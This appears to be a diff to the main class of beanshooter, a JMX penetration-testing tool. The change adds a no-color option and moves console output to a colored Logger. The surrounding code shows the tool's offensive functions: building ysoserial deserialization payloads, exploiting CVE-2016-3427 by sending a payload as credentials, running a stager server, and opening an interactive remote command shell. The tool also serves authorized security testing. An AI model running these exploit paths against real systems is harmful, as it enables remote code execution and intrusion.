@@ -24,6 +24,7 @@ import org.apache.commons.cli.Option;
 import org.apache.commons.cli.Options;
 import org.apache.commons.cli.ParseException;
 
+import de.qtc.beanshooter.io.Logger;
 import de.qtc.beanshooter.utils.RealmHandler;
 
 
@@ -87,6 +88,10 @@ public class Beanshooter {
         ssl.setRequired(false);
         options.addOption(ssl);
 
+        Option noColor = new Option(null, "no-color", false, "disable colored output");
+        noColor.setRequired(false);
+        options.addOption(noColor);
+
         Option follow = new Option(null, "follow", false, "follow redirections to other targets");
         follow.setRequired(false);
         options.addOption(follow);
@@ -129,7 +134,7 @@ public class Beanshooter {
         try {
             commandLine = parser.parse(options, argv);
         } catch (ParseException e) {
-            System.err.println("Error: " + e.getMessage() + "\n");
+            Logger.printlnPlain_ye("Error: " + e.getMessage() + "\n");
             formatter.printHelp(helpString, options);
             System.exit(1);
         }
@@ -153,6 +158,7 @@ public class Beanshooter {
         boolean followRedirect = commandLine.hasOption("follow");
         boolean stagerOnlyValue = commandLine.hasOption("stager-only");
         boolean remoteStagerValue = commandLine.hasOption("remote-stager");
+        boolean noColorValue = commandLine.hasOption("no-color");
 
         String saslValue = commandLine.getOptionValue("sasl", null);
         String ysoValue = commandLine.getOptionValue("yso", config.getProperty("ysoserial"));
@@ -174,20 +180,21 @@ public class Beanshooter {
             bindPortValue = stagerPortValue;
         if( bindAddressValue == null )
             bindAddressValue = stagerHostValue;
-
+        if( noColorValue )
+            Logger.disableColor();
 
         GreenGrocer gg = null;
         try {
             gg = new GreenGrocer(jarPath, jarName, beanClass, objectName, mLetNameString);
         } catch( MalformedObjectNameException e ) {
-            System.err.println("[-] Object name '" + objectName + "' seems to be invalid.");
+            Logger.eprintln_ye("Object name '" + objectName + "' seems to be invalid.");
             System.exit(1);
         }
 
         if( stagerOnlyValue ) {
             gg.startStagerServer(bindAddressValue, bindPortValue, stagerHostValue, stagerPortValue);
             Scanner dummyScanner = new Scanner(System.in);
-            System.out.println("Press Enter to stop listening...");
+            Logger.print_bl("Press Enter to stop listening...");
             dummyScanner.nextLine();
             dummyScanner.close();
             System.exit(0);
@@ -196,7 +203,7 @@ public class Beanshooter {
         /* At this point <IP> <PORT> and <ACTION> should be present on the command line */
         List<String> remainingArgs = commandLine.getArgList();
         if( remainingArgs.size() < 3 ) {
-            System.err.println("Error: Insufficient number of arguments.\n");
+            Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
             formatter.printHelp(helpString, options);
             System.exit(1);
         }
@@ -221,7 +228,7 @@ public class Beanshooter {
             case "ysoserial":
             case "cve-2016-3427":
                 if( remainingArgs.size() < 5 ) {
-                    System.err.println("Error: Insufficient number of arguments.\n");
+                    Logger.eprintlnPlain_ye("Error: Insufficient number of arguments.\n");
                     formatter.printHelp(helpString, options);
                     System.exit(1);
                 }
@@ -235,7 +242,8 @@ public class Beanshooter {
         try {
             remotePortNumeric = Integer.valueOf(remotePort);
         } catch( Exception e ) {
-            System.out.println("[-] Error - Remote port has to be a numeric value.");
+            Logger.eprintlnPlain_ye("Error - Remote port has to be a numeric value.\n");
+            formatter.printHelp(helpString, options);
             System.exit(1);
         }
 
@@ -243,13 +251,14 @@ public class Beanshooter {
         if( saslValue != null ) {
             saslMechanism = getSaslMechanism(saslValue, useSsl);
             if( saslMechanism == null ) {
-                System.out.println("[-] Specified SASL mechanism '" + saslValue + "' is invalid.");
-                System.out.println("[-] Possible values are:");
-                System.out.println("[-]     * NTLM");
-                System.out.println("[-]     * PLAIN");
-                System.out.println("[-]     * GSSAPI");
-                System.out.println("[-]     * CRAM-MD5");
-                System.out.println("[-]     * DIGEST-MD5");
+                Logger.eprintln_ye("Specified SASL mechanism '" + saslValue + "' is invalid.");
+                Logger.println_bl("Possible values are:");
+                Logger.increaseIndent();
+                Logger.println_bl("* NTLM");
+                Logger.println_bl("* PLAIN");
+                Logger.println_bl("* GSSAPI");
+                Logger.println_bl("* CRAM-MD5");
+                Logger.println_bl("* DIGEST-MD5");
                 System.exit(1);
             }
         }
@@ -264,12 +273,14 @@ public class Beanshooter {
         if( action.equals("cve-2016-3427") ) {
 
             if( jmxmpValue ) {
-                System.err.println("[-] Action 'cve-2016-3427' is incompatible with '--jmxmp' option.");
+                Logger.eprintln_ye("Action 'cve-2016-3427' is incompatible with '--jmxmp' option.");
                 System.exit(1);
             }
 
-            System.err.println("[+] cve-2016-3427 - Sending serialized Object as credential.");
-            System.err.println("[+]     An exception during the connection attempt is expected.");
+            Logger.println_bl("cve-2016-3427 - Sending serialized Object as credential.");
+            Logger.increaseIndent();
+            Logger.println_bl("An SecurityException during the connection attempt is expected.");
+            Logger.decreaseIndent();
             credentials = ysoPayload;
         }
 
@@ -305,17 +316,17 @@ public class Beanshooter {
             case "shell":
                 String response;
                 Console console = System.console();
-                System.out.println("[+] Starting interactive shell...\n");
+                Logger.println("Starting interactive shell...\n");
 
                 while( true ) {
-                    System.out.print("$ ");
+                    Logger.println("$ ");
                     command = console.readLine();
 
                     if( command.equals("exit") || command.equals("Exit") )
                         break;
 
                     response = gg.executeCommand(command,  false);
-                    System.out.print(response);
+                    Logger.println(response);
                 }
 
                 break;
@@ -329,12 +340,14 @@ public class Beanshooter {
                 gg.getLoggerLevel(ysoPayload);
                 break;
             case "cve-2016-3427":
-                System.out.println("[+] Encountered no Exception during cve-2016-3427 attempt.");
-                System.out.println("[+]     Does the target require authentication?");
+                Logger.println_bl("Encountered no Exception during cve-2016-3427 attempt.");
+                Logger.increaseIndent();
+                Logger.println_bl("Does the target require authentication?");
+                Logger.println_bl("If vulnerable, the payload works anyway.");
                 break;
             default:
-                System.err.println("[-] Unkown action: '" + action + "'.");
-                System.err.println("[-] Doing nothing.");
+                Logger.eprint("Unkown action: ");
+                Logger.eprintlnPlain_ye(action);
                 break;
         }
         gg.disconnect();
@@ -354,7 +367,7 @@ public class Beanshooter {
         configStream.close();
 
         } catch( IOException e ) {
-            System.out.println("[-] Unable to load properties file '" + filename + "'");
+            Logger.println_ye("Unable to load properties file '" + filename + "'");
             System.exit(1);
         }
 
@@ -394,11 +407,11 @@ public class Beanshooter {
         File ysoJar = new File(ysoPath);
 
         if( !ysoJar.exists() ) {
-            System.err.println("[-] Error: '" + ysoJar.getAbsolutePath() + "' does not exist.");
+            Logger.println_ye("Error: '" + ysoJar.getAbsolutePath() + "' does not exist.");
             System.exit(1);
         }
 
-        System.out.print("[+] Creating ysoserial payload...");
+        Logger.print("Creating ysoserial payload...");
 
         try {
             URLClassLoader ucl = new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
@@ -415,14 +428,16 @@ public class Beanshooter {
             if( e instanceof InvocationTargetException )
                 ex = e.getCause();
 
-            System.err.println("[-] Error: Unable to create ysoserial gadget '" + gadget + "'.");
-            System.err.println("[-] Error message is: " + ex.getMessage());
-            System.err.println("[-] StackTrace:");
+            Logger.eprint("Error: Unable to create ysoserial gadget ");
+            Logger.eprintlnPlain_ye(gadget);
+            Logger.eprint("Error message is: ");
+            Logger.eprintlnPlain_ye(ex.getMessage());
+            Logger.eprintln("StackTrace:");
             ex.printStackTrace();
             System.exit(1);
         }
 
-        System.out.println("done.");
+        Logger.printlnPlain("done.");
         return ysoPayload;
     }
 }
